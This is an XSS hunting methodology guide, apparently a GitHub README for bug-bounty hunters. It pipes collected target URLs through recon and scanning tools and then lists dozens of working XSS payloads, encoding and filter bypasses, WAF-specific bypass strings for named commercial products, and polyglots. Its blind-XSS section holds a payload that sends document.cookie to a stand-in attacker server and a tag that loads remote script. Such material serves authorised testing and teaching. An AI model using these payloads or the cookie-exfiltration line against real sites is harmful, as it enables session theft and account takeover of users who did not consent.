# 🎯 XSS Hunting Methodology

> **A complete, structured approach to finding and exploiting XSS — from recon to WAF bypass.**
>
> Author: ShahidKhan

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-Cross%20Site%20Scripting-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-Reflected%20%7C%20Stored%20%7C%20DOM-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Automated-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Phase 1 — URL Collection & Parameter Extraction](#-phase-1--url-collection--parameter-extraction)
2. [Phase 2 — Parameter Filtering & Reflection Testing](#-phase-2--parameter-filtering--reflection-testing)
3. [Phase 3 — Manual Exploitation in Burp Suite](#-phase-3--manual-exploitation-in-burp-suite)
4. [Phase 4 — Context-Based Payload Building](#-phase-4--context-based-payload-building)
5. [Phase 5 — Bypass Techniques](#-phase-5--bypass-techniques)
6. [Phase 6 — WAF Bypass](#-phase-6--waf-bypass)
7. [Phase 7 — Advanced & Blind XSS](#-phase-7--advanced--blind-xss)
8. [XSS Polyglots](#-xss-polyglots)
9. [Summary Workflow](#️-summary-workflow)

---

## 🔍 Phase 1 — URL Collection & Parameter Extraction

Gather as many URLs as possible from passive and active sources before filtering.

### Passive URL Collection Sources

```bash
# Wayback Machine
waybackurls target.com >> wayback_urls.txt
cat live_subs.txt | waybackurls | tee wayback_urls.txt

# gau (GetAllUrls)
gau target.com >> gau_urls.txt
cat live_subs.txt | gau | tee gau_urls.txt

# katana (modern crawler)
katana -u https://target.com -o katana_urls.txt
katana -list live_subs.txt -o katana_urls.txt

#Then combine all these urls in 1 list
cat *_urls.txt | sort -u | tee allurls.txt 
```

### Clean & Filter Live Parameters

```bash
# Full pipeline: filter params → deduplicate → probe live URLs
cat allurls.txt | grep "=" | uro | httpx-toolkit | tee params.txt
```

> 💡 **Result:** A clean, deduplicated list of live URLs with parameters — ready for XSS testing.

---

## 🧪 Phase 2 — Parameter Filtering & Reflection Testing

### Step 1 — Filter XSS-Prone Parameters

```bash
cat params.txt | gf xss | tee xss_params.txt
```

`gf xss` uses known patterns to identify parameters historically associated with XSS (e.g., `q=`, `search=`, `redirect=`, `url=`, `callback=`).

### Step 2 — Check Character Reflection with kxss

```bash
cat xss_params.txt | kxss
```

`kxss` injects special characters and reports which ones reflect back unfiltered:

```
Characters tested:  { < > ; ( ) " ' $ }
```

**How to read kxss output:**

| Characters Reflected | Meaning |
|---|---|
| `< >` reflected | Tag injection likely possible |
| `" '` reflected | Attribute escape likely possible |
| `( )` reflected | Function calls possible |
| All reflected | High confidence XSS target → go manual |

### Step 3 — Semi-Automated with Dalfox

Run dalfox before going fully manual to catch low-hanging fruit:

```bash
cat xss_params.txt | dalfox pipe
```

```bash
# Single URL deep scan
dalfox url "https://target.com/search?q=test" --deep-domxss
```

---

## 🔬 Phase 3 — Manual Exploitation in Burp Suite

Once `kxss` identifies a high-value parameter, move to Burp Suite.

### Workflow in Burp

```
1. Intercept the request with the vulnerable parameter
2. Send to Repeater (Ctrl+R)
3. Inject a probe string: "><'();${}
4. Check the Response — find where your input lands
5. Identify the CONTEXT (see Phase 4)
6. Build and refine payload based on context
7. Confirm execution (alert/confirm/prompt fires)
```

### Context Identification Cheatsheet

```html
<!-- HTML Context — input reflects between tags -->
<p>Your search: INJECT_HERE</p>

<!-- Attribute Context — input reflects inside an attribute -->
<input value="INJECT_HERE">

<!-- JavaScript Context — input reflects inside a script block -->
<script>var q = "INJECT_HERE";</script>

<!-- URL/href Context — input reflects inside a URL -->
<a href="https://site.com/INJECT_HERE">
```

---

## 🧠 Phase 4 — Context-Based Payload Building

### 🔴 Case 1: Cannot Escape the Attribute (`"` is encoded or deleted)

Try `javascript:` URI or event handler tricks:

```js
// javascript: URI in href
<a href="javascript:alert(1)">Click</a>

// With null byte / control character
<a href="&#01;javascript:alert(1)">Click</a>

// Template literal version (no parentheses needed)
<a href="javascript:{ alert`0` }">Click</a>

// onclick without escaping attribute
<a src="google.com" onclick="alert(1)">Click</a>
```

Try Unicode escapes to bypass filters:

```js
// Replace " with \u0022, > with \u003e, < with \u003c
\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
```

---

### 🟠 Case 2: Escaped Attribute but Cannot Escape Tag (`>` is encoded or deleted)

Use **event handlers** within existing tags:

```js
// onclick on input
<input value="XXXXXXX" onclick=alert(1)>Click</input>

// accesskey trick (triggered by keyboard shortcut)
<input type="text" value="XSS" accesskey="x" onclick="alert(1)">

// HTML entity encoded onerror
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

// Closing div + javascript: colon entity
</div><a src="google.com" href="javaSCRIPT&colon;alert(/xss/)">XSS</a>

// Hash-based alert
<a href=https://google.com onclick=alert(document.location.hash.substring(1))#payload>Click</a>
```

**Encoding alternatives:**

```
URL encode:        %3cscript%3e
Double URL encode: %253cscript%253e
HTML entities:     &lt;script&gt;
Unicode variants:
  %u003Csvg onload=alert(1)>
  %u3008svg onload=alert(2)>
  %uFF1Csvg onload=alert(3)>
```

---

### 🟡 Case 3: `alert` is Encoded or Deleted

Use obfuscated alternatives:

```js
// prompt and confirm are valid alert alternatives
<script>prompt(1)</script>
<script>confirm(1)</script>

// .call() and .apply() bypass keyword filters
<script>alert.call(null,1)</script>
<script>confirm.call(null,1)</script>
<script>prompt.call(null,1)</script>
<script>alert.apply(null, [1])</script>

// onclick with no brackets
<a"/onclick=(confirm)()>Click Here!

// SVG with string concat to avoid detection
<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">

// source property concat
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click

// Regex comment bypass
<script>/&/-alert(1)</script>
<script>/&amp;/-alert(1)</script>

// throw-based (no parentheses)
<script>{onerror=alert}throw 1</script>

// eval with hex encoding
<script>eval.call`${'alert\x2823\x29'}`</script>

// Heavily obfuscated JSFuck-style
<script>$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()</script>
```

---

### 🟢 Case 4: Space is Encoded or Deleted

```js
// Use tab character (URL encoded)
%09

// Example
<input%09value="XSS"%09onclick=alert(1)>Click</input>
```

---

### 🔵 Case 5: `()` Parentheses are Encoded or Deleted

```js
// Use template literals (backticks) instead
<script>alert`1`</script>
<script>confirm`1`</script>
```

---

### 🟣 Case 6: `<script>` Tag is Blocked

Use alternative HTML tags that support event handlers:

```js
// SVG
<svg onload=alert(1)>
<Svg Only=1 OnLoad=alert(1)>
<sVg OnPointerEnter="alert(1)">

// img
<img src=x onerror=alert(1)>

// iframe
<iframe src=//14.rs>
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>

// details (HTML5 toggle)
<details open ontoggle=alert(1)>

// form button
<form><button formaction=http://14.rs>Hacked</form>

// video / audio
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## 🛡️ Phase 5 — Bypass Techniques

### Null Byte Injection

```js
%00%00%00%00%00%00%00<script>alert(1)</script>
```
> Works when null bytes are output and there's no space before the payload.

### Mixed Case (Case Sensitivity Bypass)

```js
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### String Concatenation in JS Context

```js
// Split keywords across concatenations
"ale"+"rt(1)"
"al\u0065rt(1)"
```

### Character Encoding Stack

```
Raw         → <script>alert(1)</script>
URL         → %3Cscript%3Ealert(1)%3C/script%3E
Double URL  → %253Cscript%253Ealert(1)%253C/script%253E
HTML entity → &lt;script&gt;alert(1)&lt;/script&gt;
Unicode     → \u003cscript\u003ealert(1)\u003c/script\u003e
```

> 💡 In Burp Suite: `Ctrl+Shift+U` → Convert Selection → HTML → HTML-encode all characters

---

## 🧱 Phase 6 — WAF Bypass

### AWS WAF

```js
// Prepend <! to confuse parser
<!<script>confirm(1)</script>
```

### Cloudflare

```js
<Svg Only=1 OnLoad=alert(1)>
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
<script>{onerror=alert}throw 1</script>
<script>eval.call`${'alert\x2823\x29'}`</script>
```

### Akamai (filtered event handlers)

```js
<img sr%00c=x o%00nerror=((pr%00ompt(1)))>
```

### Imperva Incapsula

```js
<svg onload\r\n=$.globalEval("al"+"ert()");>
```

### Wordfence 7.4.2

```js
<a href=&#01javascript:alert(1)>
```

### Sucuri CloudProxy (POST only)

```js
<a href=javascript&colon;confirm(1)>
```

### ModSecurity CRS 3.2.0 PL1

```js
<a href="jav%0Dascript&colon;alert(1)">
```

### DotDefender

```js
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar; draggable=True>dragme
```

### Generic WAF Bypass Wordlist

🔗 [https://github.com/Walidhossain010/WAF-bypass-xss-payloads](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)

---

## 🔭 Phase 7 — Advanced & Blind XSS

### DOM-Based XSS

Look for user-controlled input flowing into dangerous sinks:

```js
// Dangerous sinks to look for in JS
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
document.location
location.href
```

```bash
# Scan for DOM XSS
dalfox url "https://target.com/page?q=test" --deep-domxss
```

### Blind XSS

Use when input is processed in a backend admin panel, email, or log viewer you can't see directly:

```js
// Host your payload on XSS Hunter or self-hosted server
"><script src=https://yourxsshunter.com/payload.js></script>
'"><img src=x onerror=document.location='https://yourserver.com/?c='+document.cookie>

// Inject into fields like:
// - User-Agent header
// - Referrer header
// - Name / bio / address fields
// - Support ticket or feedback forms
// - Log viewer inputs
```

### Stored XSS Targets

```
✅ Comment fields
✅ Profile name / bio
✅ Support ticket content
✅ Product reviews
✅ Admin notes
✅ File upload names
```

---

## 🧬 XSS Polyglots

Polyglots let you **test multiple XSS contexts with ONE payload** — work smarter, not harder.

```js
// Polyglot 1
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

// Polyglot 2 (covers HTML, JS, URL, attribute, tag contexts simultaneously)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

> 🎯 Use polyglots as your **first manual probe** — they cover the most ground in a single injection.

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│                  XSS HUNTING WORKFLOW                │
├──────────────────────────────────────────────────────┤
│                                                      │
│  1. 🔍 Collect URLs (waybackurls, gau, katana)       │
│            ↓                                         │
│  2. 🧹 Filter & Deduplicate (grep "=" | uro)         │
│            ↓                                         │
│  3. 🌐 Probe Live Targets (httpx-toolkit)            │
│            ↓                                         │
│  4. 🎯 Filter XSS Params (gf xss)                   │
│            ↓                                         │
│  5. 🔬 Test Reflection (kxss)                        │
│            ↓                                         │
│  6. 🤖 Semi-Auto Scan (dalfox pipe)                  │
│            ↓                                         │
│  7. 🔭 Identify Context (Burp Repeater)              │
│            ↓                                         │
│  8. 🧠 Build Context-Aware Payload                   │
│            ↓                                         │
│  9. 🛡️ Apply Bypass if WAF Detected                  │
│            ↓                                         │
│  10. 🔭 Check for DOM & Blind XSS                    │
│            ↓                                         │
│  11. 📝 Document & Report                            │
│                                                      │
└──────────────────────────────────────────────────────┘
```

---

### 🧠 Quick Decision Tree

```
Input reflects?
    ├── YES → Check which characters are filtered
    │           ├── " filtered  → Use javascript: URI / event handlers
    │           ├── > filtered  → Use event handlers only
    │           ├── () filtered → Use template literals (alert`1`)
    │           ├── alert blocked → Use confirm / prompt / throw / eval
    │           ├── <script> blocked → Use SVG / img / iframe / details
    │           └── WAF detected → Use WAF-specific bypass techniques
    │
    └── NO → Check for DOM XSS / Blind XSS
```

---

### 📚 Resources

- 🔗 [WAF Bypass XSS Payloads](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)
- 🔗 [Content Spoofing / HTML Injection](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- 🔗 [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- 🔗 [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

<div align="center">

### 🔥 Find the context. Escape the filter. Own the DOM.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
